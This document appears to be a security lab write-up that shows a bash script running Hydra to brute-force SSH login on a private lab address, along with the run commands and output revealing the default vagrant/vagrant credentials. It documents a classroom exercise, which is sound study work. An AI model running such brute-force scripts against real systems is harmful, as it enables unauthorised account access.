
# Task 1.2 – SSH Brute-force Using Custom Script (Hydra)

## Script File: ssh_bruteforce.sh
```bash
#!/bin/bash
# Configuration
TARGET_IP="192.168.56.6"
USERNAME="vagrant"
PASSWORD_LIST="passwords.txt"

# Run Hydra
echo "[*] Starting SSH brute-force attack on $TARGET_IP..."
hydra -l "$USERNAME" -P "$PASSWORD_LIST" ssh://"$TARGET_IP" -t 4 -f -V
```
![Script created](./screenshots/08_script_created.png)

## Execution Steps
```bash
chmod +x ssh_bruteforce.sh
./ssh_bruteforce.sh
```
![Hydra attack result](./screenshots/09_hydra_attack_output.png)

### Result:
Hydra successfully identified:
```
[22][ssh] host: 192.168.56.6   login: vagrant   password: vagrant
```
